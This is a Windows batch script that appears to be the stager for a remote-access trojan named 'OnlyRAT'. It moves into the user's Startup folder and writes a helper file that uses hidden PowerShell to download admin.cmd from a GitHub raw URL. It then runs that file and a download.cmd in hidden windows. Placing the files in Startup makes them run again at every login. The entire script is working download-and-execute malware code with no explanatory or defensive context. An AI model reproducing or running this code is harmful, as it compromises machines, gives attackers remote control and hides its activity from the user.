@echo off

REM Save the current directory
set "initialPath=%cd%"

REM Define the startup path
set "startup=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

REM Change to the startup directory
cd /d "%startup%"

REM Create the wget.cmd file to download admin.cmd
(
echo powershell -c "Start-Process powershell.exe -WindowStyle Hidden -ArgumentList 'Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/admin.cmd\" -OutFile \"admin.cmd\"'"
) > wget.cmd

REM Run wget.cmd to download admin.cmd
powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget.cmd\"' -WindowStyle Hidden"

REM Wait for the download to complete
timeout /t 10 /nobreak > nul

REM Run admin.cmd
powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\admin.cmd\"' -WindowStyle Hidden"

REM Wait for admin.cmd to finish execution
timeout /t 5 /nobreak > nul

REM Run download.cmd
powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\download.cmd\"' -WindowStyle Hidden"

REM Go back to the initial directory
cd /d "%initialPath%"

@REM del initial.cmd
